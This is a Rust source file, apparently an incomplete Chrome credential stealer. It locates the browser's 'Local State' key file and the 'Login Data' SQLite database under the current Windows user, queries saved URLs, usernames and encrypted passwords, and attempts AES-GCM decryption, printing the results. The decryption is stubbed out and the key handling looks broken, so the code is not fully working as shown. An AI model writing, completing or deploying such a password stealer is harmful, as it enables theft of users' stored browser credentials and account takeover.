use std::path::Path;
use std::fs;
use std::process::exit;
use serde_json::{Result, Value};
use sqlite::State;
use substring::Substring;
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Nonce, Key // Or `Aes128Gcm`
};
use aes_gcm::aead::consts::U12;
use aes_gcm::aead::generic_array::GenericArray;
use base64::{Engine as _, engine::general_purpose};
use encoding::{Encoding, DecoderTrap, EncoderTrap};


// C:\Users\Admin\AppData\Local\Google\Chrome\User Data
fn retrieve_secret_key() -> String {
    let fmt_path = &format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", whoami::username());
    let path = Path::new(fmt_path);


    println!("{}", fmt_path);
    if path.exists() {
        let file_content = fs::read_to_string(path)
            .expect("Unable to read file content");

        let json_content: Value = serde_json::from_str(&*file_content)
            .expect("Unable to get JSON content");

        let key = json_content["os_crypt"]["encrypted_key"].to_string();
        println!("{}", key);

        let base64_string = String::from_utf8(windows1252_to_utf8(key)).expect("Cannot build UTF-8");
        println!("{}", base64_string);

        // fix the base64 decoding
        return String::from_utf8(general_purpose::STANDARD_NO_PAD.decode( base64_string).unwrap()).expect("Cannot decode key.");
    }
    println!("Unable to find the secret key.");
    exit(1);
}

fn decrypt_user_password(ciphertext : String, iv: String, secret_key: String) -> Vec<u8> {
    let key = Key::<Aes256Gcm>::from_slice(secret_key.as_bytes());
    let cipher = Aes256Gcm::new(&key);
    let iv_vec: &[u8] = iv.as_bytes();
    let nonce: &GenericArray<u8, U12> =  Nonce::from_slice(iv_vec);

    println!("{}", iv);
    println!("{:?}", nonce);

  //  return cipher.decrypt(&nonce, ciphertext.as_ref()).expect("Failed to decrypt.");
    return vec![0];
}

fn get_user_db(secret_key : String) -> () {
    let fmt_path = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", whoami::username());

    if Path::new(&fmt_path).exists() {
        let connection = sqlite::open(fmt_path).unwrap();
        let query = "SELECT action_url, username_value, password_value FROM logins";

        let mut statement = connection.prepare(query).unwrap();

        while let Ok(State::Row) = statement.next() {
            println!("url: {}", statement.read::<String, _>("action_url").unwrap());
            println!("Username: {}", statement.read::<String, _>("username_value").unwrap());

            let mut ciphertext = statement.read::<String, _>("password_value").unwrap();
            println!("Ciphertext: {}", ciphertext);


            // Initialization vector stored between the third and fifteenth character (96-bits long)
            let iv =  ciphertext.substring(3, 15);

            let plaintext: Vec<u8> = decrypt_user_password(ciphertext.clone(), iv.to_string(), secret_key.to_string());

            println!("Decrypted password: {}", String::from_utf8(plaintext).expect("UTF-8 Conversion Failed"));

            println!("----------------------------------------------------------");

        }


    } else {
        println!("Unable to locate the sqlite database.");
        exit(1);
    }


}


fn main() {
    let key = retrieve_secret_key();

    println!("The decryption key is: {}", key);
    get_user_db(key);
}
